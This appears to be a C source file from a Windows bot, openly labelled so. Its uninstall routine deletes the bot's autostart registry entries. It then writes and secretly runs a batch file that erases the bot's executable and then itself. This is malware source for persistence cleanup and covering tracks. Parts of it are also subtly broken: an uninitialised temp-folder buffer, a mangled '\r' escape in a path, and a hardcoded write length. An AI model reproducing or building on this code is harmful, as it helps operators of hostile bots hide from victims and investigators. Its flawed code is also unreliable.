#include "includes.h"
#include "extern.h" 
// function for removing the bot's registry entries and executable
 void uninstall(void)
 {
	HKEY key;
	HANDLE f;
	DWORD r;
	PROCESS_INFORMATION pinfo;
	STARTUPINFO sinfo;
	char cmdline[256];
	char tcmdline[256];
	char cfilename[256];
	char batfile[256];
	char tempdir[256];      // name of temp folder

	// remove our registry entries
	if (AutoStart) { 
		RegCreateKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, NULL); 
		RegDeleteValue(key, valuename); 
		RegCloseKey(key); 
 
	//	RegCreateKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, NULL); 
	//	RegDeleteValue(key, valuename); 
	//	RegCloseKey(key); 
 
		RegCreateKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\RunServices", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, NULL); 
		RegDeleteValue(key, valuename); 
		RegCloseKey(key); 
 
		RegCreateKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, NULL); 
		RegDeleteValue(key, valuename); 
		RegCloseKey(key); 
 
	//	RegCreateKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, NULL); 
	//	RegDeleteValue(key, valuename);
	//	RegCloseKey(key); 
	}

	sprintf(batfile, "%s\\r.bat", tempdir);
	f = CreateFile(batfile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, 0);
	if (f > (HANDLE)0) {
		// write a batch file to remove our executable once we close
		WriteFile(f, "@echo off\r\n"
					 ":start\r\nif not exist \"\"%1\"\" goto done\r\n"
					 "del /F \"\"%1\"\"\r\n"
					 "del \"\"%1\"\"\r\n"
					 "goto start\r\n"
					 ":done\r\n"
					 "del /F %temp%\r.bat\r\n"
					 "del %temp%\r.bat\r\n", 105, &r, NULL);
		CloseHandle(f);

		memset(&sinfo, 0, sizeof(STARTUPINFO));
		sinfo.cb = sizeof(sinfo);
		sinfo.wShowWindow = SW_HIDE;

		GetModuleFileName(GetModuleHandle(NULL), cfilename, sizeof(cfilename));// get our file name
		sprintf(tcmdline, "%%comspec%% /c %s %s", batfile, cfilename); // build command line
		ExpandEnvironmentStrings(tcmdline, cmdline, sizeof(cmdline)); // put the name of the command interpreter into the command line

		// execute the batch file
		CreateProcess(NULL, cmdline, NULL, NULL, TRUE, NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, NULL, &sinfo, &pinfo);
	}
 }